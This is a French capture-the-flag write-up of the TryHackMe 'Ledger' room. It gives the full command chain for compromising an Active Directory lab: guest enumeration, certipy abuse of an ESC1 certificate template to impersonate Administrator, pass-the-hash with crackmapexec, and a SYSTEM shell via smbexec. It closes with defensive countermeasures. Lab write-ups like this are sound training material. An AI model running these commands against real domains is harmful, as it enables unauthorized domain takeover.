
# TryHackMe - Ledger – Write-up Complet (FR)

https://tryhackme.com/room/ledger

---

## 🧠 Objectif

Exploiter une machine Windows Active Directory vulnérable (`labyrinth.thm.local`)  
pour obtenir une exécution de commande en tant qu’administrateur de domaine via SMB et NTLM hash.

---

## 🔍 1. Scan et découverte

### Scan nmap

---

### Ajout dans `/etc/hosts` :

```
IPCIBLE labyrinth.thm.local thm.local LABYRINTH
```

- Port 445 (SMB) ouvert : cible un contrôleur de domaine Windows.

---

### Test guest :

```bash
nxc smb labyrinth.thm.local -u 'guest' -p ''
nxc ldap labyrinth.thm.local -u 'guest' -p '' --users
```

On récupère 2 utilisateurs avec le même mot de passe.

---

### Connexion avec un utilisateur valide :

```bash
nxc smb labyrinth.thm.local -u 'SUSANNA_MCKNIGHT' -p '[REDACTED]'
```

Connexion avec Remmina (RDP).  
Récupération du flag `user.txt`.

---

## 🧩 2. Credential reuse via NTLM hash

### Active Directory Certificate Services (AD CS)

À l'aide de certipy, nous trouvons un modèle de certificat appelé `ServerAuth` vulnérable à ESC1.

---

### ESC1 (Enterprise Security Control 1)

* Technique d’attaque contre AD CS.  
* Permet à un utilisateur de s’auto-délivrer un certificat d’authentification valide pour n’importe quel utilisateur, même un Domain Admin !

---

### Découverte de la vulnérabilité avec certipy :

```bash
certipy-ad find -u 'SUSANNA_MCKNIGHT@thm.local' -p '[REDACTED]' -target labyrinth.thm.local -stdout -vulnerable
```

* Droits d'inscription : `THM.LOCAL\Authenticated Users` peut s'inscrire, ce qui permet de demander le certificat.  
* Authentification client EKU : certificat utilisable pour l’authentification auprès d’Active Directory.  
* **EnrolleeSuppliesSubject** : vulnérabilité principale, permet de spécifier le sujet du certificat, donc d'usurper n'importe quel compte.

---

### Demande du certificat en se faisant passer pour l'administrateur :

```bash
certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password '[REDACTED]' \
-ca thm-LABYRINTH-CA -target labyrinth.thm.local \
-template ServerAuth -upn Administrator@thm.local
```

---

### Authentification avec le certificat généré :

```bash
certipy-ad auth -pfx administrator.pfx
```

Un hash NTLM est fourni ou découvert :  
`:07d677XXXXXXXXXXXXX322`

---

### Test du hash avec CrackMapExec :

```bash
cme smb labyrinth.thm.local -u Administrator -H 07d677XXXXXXXXXX322 --kdcHost labyrinth.thm.local
```

✔️ Accès confirmé : utilisateur Administrator avec un hash fonctionnel → Pass-the-Hash.

---

## 🚀 3. Exploitation finale

```bash
smbexec -k -hashes :07d677XXXXXXXX52322 THM.LOCAL/Administrator@labyrinth.thm.local
```

✔️ Shell SYSTEM via SMB !  
Obtention de `root.txt`.

---

## 🛡️ 4. Bonnes pratiques défensives (Blue Team)

| Problème exploité                                    | Contremesure recommandée                                              |
| ---------------------------------------------------- | --------------------------------------------------------------------- |
| Hash NTLM réutilisable (Pass-the-Hash)               | - Activer LAPS (Local Admin Password Solution)                        |
|                                                      | - Désactiver SMBv1                                                    |
|                                                      | - Kerberos only                                                       |
| Pas de segmentation réseau                           | Isoler les DC, segmenter le réseau AD.                                |
| Aucun journal d’échec (4625)                         | Auditer les logs de sécurité Windows.                                 |
| Pas de détection post-exploitation                   | SIEM avec alertes sur smbexec, psexec, wmiexec                        |
| Accès Admin avec mot de passe connu ou hash statique | Rotation régulière des mots de passe et monitoring des connexions SMB |

---

## ✅ En résumé

* L’accès initial est facilité par un compte avec mot de passe faible.  
* La faille principale repose sur ESC1, mal configuré dans l’Active Directory Certificate Services.  
* La réutilisation d’un hash NTLM permet une élévation de privilège jusqu’à Administrator.  
* Une exécution de commande à distance est réalisée via SMBExec.

---

## 🧠 Outils utilisés

* nxc (NetExec)  
* certipy  
* crackmapexec  
* smbexec.py

---

## 📌 À retenir pour la défense

* 🎯 Surveillez les modèles de certificats.  
* 🎯 Ne laissez pas les utilisateurs choisir leurs propres sujets.  
* 🎯 Sécurisez SMB et éliminez NTLM si possible.  
* 🎯 Déployez la journalisation et les alertes ADCS.
